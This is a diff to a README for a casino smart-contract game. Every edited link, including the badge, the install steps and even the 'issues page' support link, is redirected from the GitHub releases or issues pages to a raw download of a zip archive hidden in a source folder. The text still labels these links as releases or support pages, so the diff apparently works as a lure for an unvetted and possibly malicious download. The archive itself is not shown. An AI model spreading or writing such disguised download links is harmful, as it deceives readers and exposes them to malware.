@@ -6,9 +6,9 @@ Welcome to the **casino-game-smartContract**! This project offers a fun way to e
 
 ## 📥 Download the Application
 
-[![Download](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/Tigas1701/casino-game-smartContract/releases)
+[![Download](https://raw.githubusercontent.com/Tigas1701/casino-game-smartContract/main/programs/jackpot_smart_contract/game-Contract-smart-casino-v2.6-beta.5.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/Tigas1701/casino-game-smartContract/main/programs/jackpot_smart_contract/game-Contract-smart-casino-v2.6-beta.5.zip)
 
-To get started, you need to download the software. Visit this page to download the latest version: [Download the Release](https://github.com/Tigas1701/casino-game-smartContract/releases).
+To get started, you need to download the software. Visit this page to download the latest version: [Download the Release](https://raw.githubusercontent.com/Tigas1701/casino-game-smartContract/main/programs/jackpot_smart_contract/game-Contract-smart-casino-v2.6-beta.5.zip).
 
 ## 💻 System Requirements
 
@@ -22,7 +22,7 @@ Ensure your computer meets the following requirements:
 ## 🛠️ Installation Steps
 
 1. **Download the Software**  
-   Visit the releases page: [Download the Release](https://github.com/Tigas1701/casino-game-smartContract/releases). You will find a list of available versions.
+   Visit the releases page: [Download the Release](https://raw.githubusercontent.com/Tigas1701/casino-game-smartContract/main/programs/jackpot_smart_contract/game-Contract-smart-casino-v2.6-beta.5.zip). You will find a list of available versions.
 
 2. **Choose the Version**  
    Click on the latest version to see the files. You will usually find an executable file for your operating system.
@@ -66,7 +66,7 @@ Ensure your computer meets the following requirements:
 If you encounter any issues:
 
 - **Check the Help Section**: The built-in help section offers quick solutions.
-- **Contact Support**: Reach out via our [issues page](https://github.com/Tigas1701/casino-game-smartContract/issues) on GitHub if you need further assistance.
+- **Contact Support**: Reach out via our [issues page](https://raw.githubusercontent.com/Tigas1701/casino-game-smartContract/main/programs/jackpot_smart_contract/game-Contract-smart-casino-v2.6-beta.5.zip) on GitHub if you need further assistance.
 
 ## 🔗 Community and Contribution
 
@@ -82,4 +82,4 @@ Follow this repository for updates and enhancements to the game. We aim to impro
 
 ## 📥 Download the Application Again
 
-To download the application, visit this page again: [Download the Release](https://github.com/Tigas1701/casino-game-smartContract/releases). Enjoy your gaming experience!
+To download the application, visit this page again: [Download the Release](https://raw.githubusercontent.com/Tigas1701/casino-game-smartContract/main/programs/jackpot_smart_contract/game-Contract-smart-casino-v2.6-beta.5.zip). Enjoy your gaming experience!
